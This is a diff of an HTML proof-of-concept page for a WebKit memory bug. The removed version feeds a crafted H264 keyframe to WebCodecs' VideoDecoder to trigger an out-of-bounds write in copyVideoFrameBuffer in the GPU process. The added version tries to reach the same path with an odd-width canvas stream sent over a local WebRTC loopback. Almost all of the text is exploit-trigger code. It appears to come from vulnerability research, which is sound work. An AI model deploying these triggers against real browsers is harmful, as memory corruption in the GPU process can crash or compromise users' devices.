@@ -1,95 +1,49 @@
 <!DOCTYPE html>
-<html>
-<head><title>dfe0d84a7b PoC</title></head>
+<html><head><title>dfe0d84a7b v3</title></head>
 <body>
 <script>
-// dfe0d84a7b: H264 frame_crop_right_offset=1 → odd visible_width
-// Target: WebKit copyVideoFrameBuffer OOB write in GPU process
-// Trigger: WebCodecs VideoDecoder API
-
-// Minimal H264: SPS(16x16 coded, frame_crop_right_offset=1), PPS, IDR
-// SPS encodes frame_crop_right_offset=1 without SubWidthC multiplication bug
-const H264_HEX = "000000016742c01ec69dad000000016cc4e200000001658884003ffffffe";
-
-function hexToBytes(hex) {
-    const arr = new Uint8Array(hex.length / 2);
-    for (let i = 0; i < arr.length; i++)
-        arr[i] = parseInt(hex.substr(i*2, 2), 16);
-    return arr;
-}
-
 function post(msg) {
-    console.log('[PoC] ' + msg);
-    try { window.webkit.messageHandlers.status.postMessage(String(msg)); } catch(e) {}
+    console.log('[PoC] '+msg);
+    try{window.webkit.messageHandlers.status.postMessage(String(msg));}catch(e){}
 }
-
-async function runPoC() {
+async function run() {
     post('START');
-
-    // Check WebCodecs availability
-    if (typeof VideoDecoder === 'undefined') {
-        post('FAIL:NoWebCodecs');
-        return;
-    }
-    post('INFO:WebCodecs available');
-
-    const h264Data = hexToBytes(H264_HEX);
-    post('INFO:H264 bytes=' + h264Data.length);
-
-    let outputCount = 0;
-
-    const decoder = new VideoDecoder({
-        output: (frame) => {
-            outputCount++;
-            const w = frame.visibleRect ? frame.visibleRect.width : frame.codedWidth;
-            const h = frame.visibleRect ? frame.visibleRect.height : frame.codedHeight;
-            post('DECODED:' + outputCount + ':w=' + w + ':h=' + h);
-
-            // copyTo triggers the copyVideoFrameBuffer path
-            const bufSize = frame.allocationSize();
-            const dest = new ArrayBuffer(bufSize > 0 ? bufSize : 512);
-            frame.copyTo(dest).then(() => {
-                frame.close();
-                post('COPYTO:OK:buf=' + dest.byteLength);
-            }).catch(err => {
-                frame.close();
-                post('COPYTO_ERR:' + err.message);
-            });
-        },
-        error: (err) => {
-            post('DECODE_ERR:' + err.message);
-        }
-    });
-
+    if(typeof RTCPeerConnection==='undefined'){post('FAIL:NoWebRTC');post('DONE');return;}
+    post('INFO:RTCPeerConnection available');
     try {
-        // Configure for H264 Baseline Level 3.0, 16x16
-        await decoder.configure({
-            codec: 'avc1.42001E',
-            codedWidth: 16,
-            codedHeight: 16,
-            hardwareAcceleration: 'prefer-hardware'
-        });
-        post('INFO:Decoder configured');
-
-        // Submit the malformed keyframe
-        decoder.decode(new EncodedVideoChunk({
-            type: 'key',
-            timestamp: 0,
-            duration: 33333,
-            data: h264Data
-        }));
-        post('INFO:Chunk submitted');
-
-        await decoder.flush();
-        post('FLUSH:done:outputs=' + outputCount);
-    } catch(e) {
-        post('ERR:' + e.message);
-    }
-
-    setTimeout(() => post('DONE'), 2000);
+        const pc1=new RTCPeerConnection({iceServers:[]});
+        const pc2=new RTCPeerConnection({iceServers:[]});
+        pc1.onicecandidate=e=>{if(e.candidate)pc2.addIceCandidate(e.candidate);};
+        pc2.onicecandidate=e=>{if(e.candidate)pc1.addIceCandidate(e.candidate);};
+        pc2.ontrack=e=>{
+            post('TRACK:kind='+e.track.kind);
+            const v=document.createElement('video');
+            v.autoplay=true;v.muted=true;
+            v.srcObject=e.streams[0];document.body.appendChild(v);
+            v.onloadeddata=()=>post('VIDEO:playing');
+        };
+        const canvas=document.createElement('canvas');
+        canvas.width=319;canvas.height=240;
+        const ctx=canvas.getContext('2d');
+        let f=0;
+        setInterval(()=>{
+            ctx.fillStyle='hsl('+(f++*5)+',100%,50%)';
+            ctx.fillRect(0,0,319,240);
+        },33);
+        const stream=canvas.captureStream(30);
+        stream.getTracks().forEach(t=>pc1.addTrack(t,stream));
+        const offer=await pc1.createOffer();
+        await pc1.setLocalDescription(offer);
+        await pc2.setRemoteDescription(offer);
+        const answer=await pc2.createAnswer();
+        await pc2.setLocalDescription(answer);
+        await pc1.setRemoteDescription(answer);
+        post('CONNECTED');
+        setTimeout(()=>{
+            post('STATE:pc1='+pc1.connectionState+':pc2='+pc2.connectionState);
+            post('DONE');
+        },10000);
+    } catch(e){post('ERR:'+e.message);post('DONE');}
 }
-
-window.addEventListener('load', runPoC);
-</script>
-</body>
-</html>
+window.addEventListener('load',run);
+</script></body></html>
